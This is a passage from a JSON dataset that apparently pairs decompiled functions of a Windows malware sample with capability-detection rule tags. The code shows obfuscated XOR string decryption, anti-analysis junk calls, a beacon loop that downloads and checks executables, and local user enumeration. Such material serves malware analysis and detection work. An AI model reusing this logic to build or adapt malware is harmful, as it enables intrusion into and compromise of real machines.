(iVar6 < 0x43);\n                        }\n                        else {\n                            var_18h = 0xc4a6966;\n                            var_14h._0_1_ = 0x3e;\n                            var_14h._1_1_ = 0x42;\n                            var_14h._2_1_ = 0xe;\n                            var_14h._3_1_ = 0x1d;\n                            var_10h._0_1_ = 0x35;\n                            var_10h._1_2_ = 0x497a;\n                            var_10h._3_1_ = 0x42;\n                            var_ch._0_1_ = 0x79;\n                            var_ch._1_1_ = 4;\n                            var_ch._2_2_ = 0x414b;\n                            var_8h = 0x41625335;\n                            var_4h = CONCAT22(var_4h._2_2_, 0x7972);\n                            fcn.00401000(0x10);\n                            iVar6 = 0;\n                            do {\n                                iVar9 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                                if (iVar9 != 0xe9ec6c) {\n                                    *(iVar6 + var_2ch) =\n                                         *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + var_2ch)[&var_18h - var_2ch];\n                                }\n                                iVar6 = iVar6 + 1;\n                            } while (iVar6 < 0x10);\n                        }\n                        var_ach = 0xc;\n                        var_a4h = 0;\n                        var_a8h = 0;\n                        (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                                  (var_2ch, 1, &var_a8h, 0);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_2ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    }\n                }\n                *0x41cccc = fcn.00404e75();\n                pcVar3 = _sym.imp.KERNEL32.dll_GlobalFindAtomW;\n                *0x41cccc = *0x41cccc & 0xffff;\n                iVar4 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(*0x41cd20);\n                pcVar2 = _sym.imp.KERNEL32.dll_FindAtomW;\n                if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(*0x41cd20),  iVar4 != 0)) {\n                    var_38h = fcn.0040db0e();\n                    if (var_38h == 0) {\n                        var_38h = fcn.0040db0e();\n                    }\n                    fcn.0040d97a();\n                    fcn.0040d97a();\n                    iVar4 = (*pcVar3)(*0x41cd20);\n                    if (iVar4 != 0) {\n                        uVar5 = (*pcVar3)(*0x41cd20);\n                        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar5);\n                    }\n                    iVar4 = (*pcVar2)(*0x41cd20);\n                    if (iVar4 != 0) {\n                        uVar5 = (*pcVar2)(*0x41cd20);\n                        (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar5);\n                    }\n                }\n                var_18h = 0x191d2217;\n                var_14h._0_1_ = 10;\n                var_14h._1_1_ = 0x11;\n                var_14h._2_1_ = 0x32;\n                var_14h._3_1_ = 0x1d;\n                var_10h._0_1_ = 0x22;\n                var_10h._1_2_ = 0x1e0c;\n                var_10h._3_1_ = 0x3f;\n                var_ch._0_1_ = 10;\n                var_ch._1_1_ = 0x46;\n                var_2ch = 0x46785a72;\n                var_28h._0_1_ = 0x79;\n                fcn.00401000(0xe);\n                iVar6 = var_9ch;\n                iVar13 = 0;\n                iVar9 = &var_18h - var_9ch;\n                do {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessorNumber)();\n                    if (iVar7 != 0xcd4e75) {\n                        *(iVar13 + iVar6) = *(&var_2ch + iVar13 % var_50h) ^ (iVar13 + iVar6)[iVar9];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 0xe);\n                var_18h = 0x372d2e12;\n                var_14h._0_1_ = 0x21;\n                var_14h._1_1_ = 0;\n                var_14h._2_1_ = 0x36;\n                var_14h._3_1_ = 0x23;\n                var_10h._0_1_ = 0x37;\n                var_10h._1_2_ = 0xc20;\n                var_10h._3_1_ = 0x2e;\n                var_ch._0_1_ = 0x21;\n                var_ch._1_1_ = 0x59;\n                var_34h = 0x594c5a61;\n                var_30h._0_1_ = 0x45;\n                fcn.00401000(0xe);\n                iVar6 = var_98h;\n                iVar9 = 0;\n                var_2ch = &var_18h - var_98h;\n                do {\n                    iVar13 = (*_sym.imp.USER32.dll_DestroyCaret)();\n                    if (iVar13 != 0x3e8822) {\n                        *(iVar9 + iVar6) = *(&var_34h + iVar9 % var_50h) ^ (iVar9 + iVar6)[var_2ch];\n                    }\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < 0xe);\n                var_8h = 0x4d341e4a;\n                var_4h = CONCAT22(var_4h._2_2_, 0x785c);\n                var_4ch = 0x686b6d6f;\n                var_48h._0_2_ = 0x7838;\n                fcn.00401000(6);\n                iVar6 = var_2ch;\n                iVar13 = 0;\n                iVar9 = &var_8h - var_2ch;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar7 != 0x85a332) {\n                        puVar1 = iVar13 + iVar6;\n                        *puVar1 = *(&var_4ch + iVar13 % var_3ch) ^ puVar1[iVar9];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 6);\n                uVar11 = var_38h;\n                if (var_38h == 0) {\n                    uVar11 = *0x41ca50;\n                }\n                (*_sym.imp.USER32.dll_wsprintfA)(&var_14ch, iVar6, var_9ch, uVar11);\n                *0x41cd40 = fcn.0040bb2f();\n                *0x41cccc = 6000;\n                var_38h = var_38h & 0xff000000 | 0x36115d;\n                var_8h = 0x77367578;\n                var_4h = CONCAT22(var_4h._2_2_, 0x4946);\n                fcn.00401000(3);\n                iVar6 = var_34h;\n                iVar13 = 0;\n                iVar9 = &var_38h - var_34h;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                    if (iVar7 != 0x8ee42a) {\n                        puVar1 = iVar13 + iVar6;\n                        *puVar1 = *(&var_8h + iVar13 % var_3ch) ^ puVar1[iVar9];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 3);\n                (*_sym.imp.USER32.dll_wsprintfA)(&var_10ch, iVar6, *0x41cccc);\n                var_44h = 0x2a192220;\n                var_40h._0_1_ = 0x6d;\n                var_8h = 0x4f6c5054;\n                var_4h = CONCAT22(var_4h._2_2_, 0x716d);\n                fcn.00401000(5);\n                iVar6 = var_4ch;\n                iVar13 = 0;\n                iVar9 = &var_44h - var_4ch;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_DestroyCaret)();\n                    if (iVar7 != 0xc8daa9) {\n                        *(iVar13 + iVar6) = *(&var_8h + iVar13 % var_3ch) ^ (iVar13 + iVar6)[iVar9];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 5);\n                var_14h._0_1_ = 1;\n                var_14h._1_1_ = 0x3c;\n                var_14h._2_1_ = 0x26;\n                var_14h._3_1_ = 0x1c;\n                var_10h._0_1_ = 0x2b;\n                var_10h._1_2_ = 0x2823;\n                var_10h._3_1_ = 0x30;\n                var_ch._0_1_ = 0x2c;\n                var_ch._1_1_ = 0x78;\n                var_8h = 0x78485977;\n                var_4h = CONCAT22(var_4h._2_2_, 0x5144);\n                fcn.00401000(10);\n                iVar6 = var_44h;\n                iVar13 = 0;\n                iVar9 = &var_14h - var_44h;\n                do {\n                    iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                    if (iVar7 != 0xf52915) {\n                        *(iVar13 + iVar6) = *(&var_8h + iVar13 % var_3ch) ^ (iVar13 + iVar6)[iVar9];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 10);\n                var_1ch = 0x7333821;\n                var_18h = 0x3a232a35;\n                var_14h._0_1_ = 0x3f;\n                var_14h._1_1_ = 0x1a;\n                var_14h._2_1_ = 0x36;\n                var_14h._3_1_ = 0x37;\n                var_10h._0_1_ = 0x3a;\n                var_10h._1_2_ = 0x283c;\n                var_10h._3_1_ = 0x1b;\n                var_ch._0_1_ = 0x2c;\n                var_ch._1_1_ = 0x3c;\n                var_ch._2_2_ = 0x5929;\n                var_8h = 0x695a594c;\n                var_4h = CONCAT22(var_4h._2_2_, 0x5845);\n                fcn.00401000(0x14);\n                uVar11 = var_38h;\n                iVar9 = 0;\n                iVar6 = &var_1ch - var_38h;\n                do {\n                    iVar13 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar13 != 0xaa60c) {\n                        *(iVar9 + uVar11) = *(&var_8h + iVar9 % var_3ch) ^ (iVar9 + uVar11)[iVar6];\n                    }\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < 0x14);\n                var_20h = 0x2c3e0424;\n                var_1ch = 0x39291b1b;\n                var_18h = 0xb13003b;\n                var_14h._0_1_ = 0;\n                var_14h._1_1_ = 0x27;\n                var_14h._2_1_ = 6;\n                var_14h._3_1_ = 2;\n                var_10h._0_1_ = 0x27;\n                var_10h._1_2_ = 0x3b31;\n                var_10h._3_1_ = 0x11;\n                var_ch._0_1_ = 0x76;\n                var_8h = 0x48506576;\n                var_4h = CONCAT31(var_4h._1_3_, 0x74);\n                fcn.00401000(0x15);\n                iVar6 = var_3ch;\n                iVar13 = 0;\n                iVar9 = &var_20h - var_3ch;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    if (iVar7 != 0x66ce2) {\n                        *(iVar13 + iVar6) = *(&var_8h + iVar13 % var_50h) ^ (iVar13 + iVar6)[iVar9];\n                    }\n                    pcVar2 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 0x15);\n                (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_98h, var_4ch);\n                (*pcVar2)(var_44h, &var_14ch);\n                (*pcVar2)(var_38h, 0x41ca54);\n                (*pcVar2)(iVar6, &var_10ch);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n                puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                puVar14 = puVar10;\n                for (iVar9 = 0xc; iVar9 != 0; iVar9 = iVar9 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                *puVar10 = 0x20;\n                *0x41cd30 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n                pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n                *0x41ccd0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040130a, puVar10, 0, 0);\n                *0x41ccd4 = (*pcVar2)(0, 0, fcn.00405c47, *0x41cd3c, 0, 0);\n                *0x41ccd8 = (*pcVar2)(0, 0, fcn.00403790, puVar10, 0, 0);\n                uVar8 = (*pcVar2)(0, 0, fcn.0040d951, arg_8h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar3)(0, var_38h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_44h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_4ch);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_34h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_2ch);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_98h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_9ch);\n                (*pcVar2)(uVar8);\n                return 0;\n            }\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 7);\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    } while( true );\n}\n",
        "token_count": 6152
    },
    "00405947": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00405947(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    int32_t *var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_78h = *0x41caa0;\n    var_68h = *0x41ccc0;\n    var_58h = 0xc0d5215;\n    var_54h = 0x58133e56;\n    var_50h = 0x34580207;\n    var_4ch = 0x18015e19;\n    var_48h = 0x44072a42;\n    var_44h = 0x20441e1b;\n    var_40h = 0x45404a0d;\n    var_3ch = 0x346696c;\n    var_38h = 0x6f055d5a;\n    var_34h = 0x685e094c;\n    var_ch = 0x686e3074;\n    var_8h._0_2_ = 0x5833;\n    fcn.00401000(0x28);\n    iVar4 = var_10h;\n    iVar5 = 0;\n    var_70h = 6;\n    iVar7 = &var_58h - var_10h;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar2 != 0x9f0eb9) {\n            *(iVar5 + iVar4) = *(&var_ch + iVar5 % var_70h) ^ (iVar5 + iVar4)[iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    var_60h = 0;\n    var_4h = \"3333\";\n    do {\n        var_ch = 0;\n        var_6ch = 0;\n        iVar5 = 0;\n        var_5ch = 1;\n        iVar7 = var_60h;\n        do {\n            if ((var_4h[iVar7] != '\\0') &&\n               (iVar2 = (*_sym.imp.ntdll.dll_strchr)(iVar4, var_4h[iVar7]),  iVar7 = var_60h,  iVar2 == 0)) {\n                iVar2 = 0;\n                break;\n            }\n            iVar5 = iVar5 + 1;\n            iVar2 = var_5ch;\n        } while (iVar5 < 0x20);\n        if (((*var_4h != '\\0') && (var_4h[0x1f] == '\\0')) && (iVar2 != 0)) {\n            var_30h = 0x3437037c;\n            var_2ch = 0x23a4b07;\n            puVar6 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            var_28h = 0x1d5a6533;\n            puVar6 = &var_20h;\n            for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            var_24h._0_2_ = 0x7137;\n            var_18h = 0x51477153;\n            var_14h._0_2_ = 0x3875;\n            fcn.00401000(0xe);\n            iVar4 = var_74h;\n            iVar7 = 0;\n            var_5ch = &var_30h - var_74h;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                if (iVar5 != 0xb9dbe9) {\n                    *(iVar7 + iVar4) = *(&var_18h + iVar7 % var_70h) ^ (iVar7 + iVar4)[var_5ch];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar4, var_78h);\n            iVar7 = fcn.004041af(0, &ARG_0, &var_6ch, &var_ch);\n            if (iVar7 == 0) {\n                if (var_6ch == 0) {\n                    fcn.0040ba41();\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    break;\n                }\n                if (var_20h < var_6ch) {\n                    fcn.0040ba41();\n                    var_68h = var_68h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_68h % 600000 + 60000);\n                }\n                else if (((4 < var_6ch) && (var_6ch == var_20h)) &&\n                        ((var_1ch != NULL && ((*var_1ch == 'M' && (var_1ch[1] == 'Z')))))) {\n                    fcn.0040b9ea();\n                    fcn.0040ba41();\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    break;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n            iVar4 = var_10h;\n        }\n        var_4h = var_4h + 0x20;\n        var_60h = var_60h + 1;\n    } while (var_4h < 0x41ca50);\n    iVar4 = *var_64h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar4 != 0;\n}\n",
        "token_count": 1707
    },
    "00405c47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405cc1)\n// WARNING: Removing unreachable block (ram,0x00405cd1)\n// WARNING: Removing unreachable block (ram,0x00405cde)\n// WARNING: Removing unreachable block (ram,0x00405ce9)\n// WARNING: Removing unreachable block (ram,0x00405cf8)\n// WARNING: Removing unreachable block (ram,0x00405d00)\n// WARNING: Removing unreachable block (ram,0x00405d02)\n// WARNING: Removing unreachable block (ram,0x00405d08)\n// WARNING: Removing unreachable block (ram,0x00405d1e)\n\nuint __cdecl fcn.00405c47(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41ccc0;\n    puVar4 = 0x41cd28;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040586a();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41cdf4 == 0) {\n        if (*0x41caa0 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.00405947();\n            if (iVar2 != 0) {\n                fcn.0040ba41();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 437
    },
    "00405d9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405d9a(uint param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint noname_0;\n    uint noname_0_00;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    uint var_a4h;\n    uint var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    uint32_t var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7bh;\n    uint var_74h;\n    uint *var_70h;\n    uint *var_6ch;\n    int32_t lpMem;\n    uchar *pszFirst;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *ARG_0;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_70h = NULL;\n    var_9ch = 0;\n    var_a4h = 0;\n    var_8ch = 0;\n    var_6ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    pszFirst = puVar4;\n    fcn.00406ef1();\n    if (puVar4 != NULL) {\n        var_60h = 0x45704d48;\n        var_5ch = 0x311d6d03;\n        var_58h = 0x4d2c5301;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_54h = 0x6d124565;\n        var_50h = 0x53193168;\n        var_4ch = 0x45584d20;\n        var_48h = 0x313f6d30;\n        var_44h = 0x4d1e532a;\n        var_40h = 0x6d35455e;\n        var_3ch = 0x53193139;\n        var_38h = 0x455f4d24;\n        var_34h = 0x31286d27;\n        var_30h = 0x4d035337;\n        var_2ch = 0x6d274554;\n        var_28h = 0x5300316d;\n        var_24h = 0x45414d15;\n        var_20h = 0x31226d3f;\n        var_1ch = 0x4d085337;\n        var_18h = 0x6d0f4543;\n        var_14h._0_2_ = 0x314d;\n        var_8h = 0x45314d6d;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x53);\n        fcn.00401000(0x9c);\n        iVar6 = var_94h;\n        iVar8 = 0;\n        ARG_0 = 0x5;\n        iVar9 = &var_60h - var_94h;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar5 != 0x11cc43) {\n                puVar1 = iVar8 + iVar6;\n                *puVar1 = *(&var_8h + iVar8 % ARG_0) ^ puVar1[iVar9];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n        var_30h = 0x5a126f4b;\n        var_2ch = 0x6f4c5a42;\n        var_28h = 0x5a5c5a0e;\n        var_24h = 0x5a196f48;\n        var_20h = 0x6f5e5a5e;\n        var_1ch = 0x5a5d5a02;\n        var_18h = 0x5a6b6f5d;\n        var_8h = 0x5a6b6f38;\n        var_4h._0_2_ = 0x5a31;\n        fcn.00401000(0x38);\n        iVar6 = lpMem;\n        iVar8 = 0;\n        var_98h = 6;\n        iVar9 = &var_30h - lpMem;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n            puVar4 = pszFirst;\n            if (iVar5 != 0x35a3db) {\n                puVar1 = iVar8 + iVar6;\n                *puVar1 = *(&var_8h + iVar8 % var_98h) ^ puVar1[iVar9];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x1c);\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar6);\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar6 != 0) {\n            var_3ch = 0x6b17645d;\n            var_38h = 0x4417781f;\n            var_34h = 0x641d661f;\n            var_30h = 0x78346b29;\n            var_2ch = 0x6604440b;\n            var_28h = 0x6b61640c;\n            var_24h = 0x4430783a;\n            var_20h = 0x640b660a;\n            var_1ch = 0x78156b2f;\n            var_18h = 0x666b4438;\n            var_8h = 0x6b446478;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x66);\n            fcn.00401000(0x50);\n            uVar2 = var_ch;\n            iVar9 = 0;\n            iVar6 = &var_3ch - var_ch;\n            do {\n                iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n                puVar4 = pszFirst;\n                if (iVar8 != 0x68d6b) {\n                    *(iVar9 + uVar2) = *(&var_8h + iVar9 % ARG_0) ^ (iVar9 + uVar2)[iVar6];\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar2, pszFirst, 0x104);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41cd24);\n        iVar6 = fcn.004067bf(var_6ch);\n        if (iVar6 == 0) {\n            fcn.0040637a();\n            do {\n                iVar6 = (*_sym.imp.NETAPI32.dll_NetUserEnum)\n                                  (0, 0, 2, &var_70h, 0xffffffff, &var_8ch, &var_9ch, &var_a4h);\n                var_8h = iVar6;\n                if ((iVar6 == 0) || (iVar6 == 0xea)) {\n                    var_6ch = var_70h;\n                    if (var_70h != NULL) {\n                        var_ch = 0;\n                        puVar7 = var_70h;\n                        if (var_8ch != 0) {\n                            do {\n                                var_6ch = puVar7;\n                                if (puVar7 == NULL) break;\n                                uVar3 = (*pcVar10)(0, 0x208);\n                                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                if (ARG_0 != NULL) {\n                                    puVar4 = ARG_0;\n                                    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                        *puVar4 = 0;\n                                        puVar4 = puVar4 + 1;\n                                    }\n                                    var_88h = fcn.0040bdd2();\n                                    var_84h = 0x6f21514a;\n                                    var_80h._0_1_ = 5;\n                                    stack0xffffff7d = 0x21514a30;\n                                    var_7bh._0_2_ = 0x5a6f;\n                                    var_7bh._2_1_ = 0x30;\n                                    stack0xffffff84 = 0x6f52516f;\n                                    var_74h._0_2_ = 0x305a;\n                                    fcn.00401000(0x18);\n                                    iVar6 = var_90h;\n                                    iVar8 = 0;\n                                    iVar9 = &var_84h - var_90h;\n                                    do {\n                                        iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                                        puVar7 = var_6ch;\n                                        uVar3 = var_88h;\n                                        if (iVar5 != 0x27a458) {\n                                            *(iVar8 + iVar6) =\n                                                 *(&var_7bh + iVar8 % var_98h + 3) ^ (iVar8 + iVar6)[iVar9];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0xc);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar6, *var_6ch, var_88h);\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                    var_88h = *puVar7;\n                                    iVar9 = fcn.0040caa7(noname_0, var_88h);\n                                    if (iVar9 == 0) {\n                                        fcn.0040c4db(noname_0_00, var_88h);\n                                    }\n                                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                    uVar3 = (*pcVar10)(0, iVar6);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                }\n                                puVar7 = puVar7 + 1;\n                                var_ch = var_ch + 1;\n                                var_6ch = puVar7;\n                            } while (var_ch < var_8ch);\n                        }\n                        goto code_r0x00406200;\n                    }\n                }\n                else {\ncode_r0x00406200:\n                    iVar6 = var_8h;\n                    if (var_70h != NULL) {\n                        (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_70h);\n                        var_70h = NULL;\n                    }\n                }\n            } while (iVar6 == 0xea);\n            puVar4 = pszFirst;\n            if (var_70h != NULL) {\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_70h);\n                puVar4 = pszFirst;\n            }\n        }\n        uVar3 = (*pcVar10)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar10)(0, lpMem);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar10)(0, var_94h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 2977
    },
    "0040625d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
